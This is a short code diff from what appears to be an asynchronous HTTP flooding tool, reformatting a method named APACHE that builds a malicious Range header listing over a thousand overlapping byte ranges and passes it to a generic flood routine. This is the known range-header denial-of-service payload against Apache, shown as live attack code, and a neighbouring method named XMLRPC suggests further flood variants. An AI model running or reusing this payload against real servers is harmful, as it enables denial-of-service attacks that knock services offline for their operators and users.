@@ -970,7 +970,8 @@ class AsyncHttpFlood(HttpFlood):
         return await self._generic_flood(payload)
     
     async def APACHE(self) -> int:
-        payload: bytes = self.generate_payload("Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
+        payload: bytes = self.generate_payload(
+            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024)))
         return await self._generic_flood(payload)
     
     async def XMLRPC(self) -> int:
